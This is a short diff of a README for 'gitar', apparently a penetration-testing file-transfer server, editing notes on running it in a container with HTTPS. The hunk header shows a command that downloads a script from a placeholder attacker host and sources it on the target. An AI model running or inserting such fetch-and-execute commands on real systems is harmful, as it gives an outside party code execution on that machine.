@@ -62,8 +62,7 @@ curl -s http://[attacker_ip:port]/alias > /tmp/alias && source /tmp/alias && rm 
  
 This is basicaly the same as launching `gitar` server. But as we expose our http server we become the prey. Hence we must harden a bit the server. To do this we launch `gitar` inside a container and use HTTPS.
 
-* Enable HTTPS
-* To use container image, you have to built it from ` Dockerfile`: `make build.gitar.image`
+*To use container image, you have to built it from ` Dockerfile`: `make build.gitar.image`*
 
 The following steps expose files of current directory. Files uploaded by remote are written inside current directory also.
 #### (Attacker machine)
